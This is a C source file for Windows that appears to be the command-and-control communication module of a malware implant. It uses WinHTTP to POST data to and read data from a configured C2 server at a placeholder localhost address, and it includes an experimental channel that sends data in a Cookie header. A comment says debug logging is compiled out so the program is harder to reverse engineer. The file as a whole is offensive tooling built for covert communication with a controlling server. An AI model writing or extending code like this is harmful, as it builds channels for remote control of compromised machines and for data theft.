#ifndef C2_COMMS
#define C2_COMMS
#endif

#include <stdio.h>
#include <winhttp.h>
#pragma comment(lib, "Winhttp.lib")


// Conditionally compile logging function only when debug flag is set.
// This will make the program harder to reverse engineer since it won't have
// error messages anywhere.
#ifdef DEBUG
void c2_log(const char* format, ...) {
    va_list args;
    int ret;

    va_start(args, format);
    vprintf(format, args);
    va_end(args);
}
#else
void c2_log(const char* format, ...) {
    return;
}
#endif

// Configurations
#define C2_IP L"127.0.0.1"
#define C2_PORT 80
#define C2_API_ENDPOINT L"/post"
#define C2_USER_AGENT L"TESTNG AGENT"

// Global handles for communication
HINTERNET hSession;
HINTERNET hConnect;
HINTERNET hRequest;

const char* ACCEPTED_FILETYPES[] = {"text/html", NULL}; // unused for now


// Sets up global HTTP connection handlers.
// Returns 0 on success and -1 on failure.
int SetupComms() {
    // Setup HTTP context
    HINTERNET hSession = WinHttpOpen(C2_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(hSession)
        hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
    else {
        c2_log("[!] SetupComms:WinHttpOpen failed with status %d\n", GetLastError());
        return -1;
    }

    // Disable automatic cookie handling
    DWORD option = WINHTTP_DISABLE_COOKIES;
    if (hConnect)
        WinHttpSetOption(hConnect, WINHTTP_OPTION_DISABLE_FEATURE, &option, sizeof(option));

    return (hConnect == NULL) ? -1 : 0;
}


// Cleans up HTTP handles
void TearDownComms() {
    if (hRequest) {WinHttpCloseHandle(hRequest);}
    if (hConnect) {WinHttpCloseHandle(hConnect);}
    if (hSession) {WinHttpCloseHandle(hSession);}
}


void c2_reset_handle() {
    // Close if it exists already
    if (hRequest)
        WinHttpCloseHandle(hRequest);

    hRequest = WinHttpOpenRequest(hConnect, L"POST", C2_API_ENDPOINT, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
}


// Sends data to C2 server via HTTP.
// Len is length of data.
int c2_send(char* data, int len) {
    BOOL result;

    c2_reset_handle();

    result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,       // headers
        0,          // header length
        data,       // data
        len,        // data length
        len,        // total length
        0           // optional context?
    );

    if (!result) {
        c2_log("[!] WinHttpSendRequest failed with code %d\n", GetLastError());
        return 0;
    }
    return len;
}


// Receives data via HTTP from C2 server.
// Len is length of buffer.
int c2_recv(char* buffer, int len) {
    BOOL result;
    DWORD numBytesRead;

    // Don't reset handle on response, otherwise we cant get the data

    // Get response
    result = WinHttpReceiveResponse(hRequest, NULL);
    if(!result) {
        c2_log("[!] WinHttpReceiveResponse failed with code %d\n", GetLastError());
        return 0;
    }

    // Read data in response
    result = WinHttpReadData(hRequest, buffer, len, &numBytesRead);
    if(!result) {
        c2_log("[!] WinHttpReadData failed with code %d\n", GetLastError());
        return 0;
    }

    return numBytesRead;
}


// TEST. Data must be wide char
int c2_send_cookie(wchar_t* data, int len) {
    BOOL result;

    c2_reset_handle();

    WinHttpAddRequestHeaders( hRequest, L"Cookie: test=$$$$$",(ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );

    result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,       // headers
        0,          // header length
        WINHTTP_NO_REQUEST_DATA,       // data
        0,        // data length
        0,        // total length
        0           // optional context?
    );

    if (!result) {
        c2_log("[!] cookie:WinHttpSendRequest failed with code %d\n", GetLastError());
        return 0;
    }

    return len;
}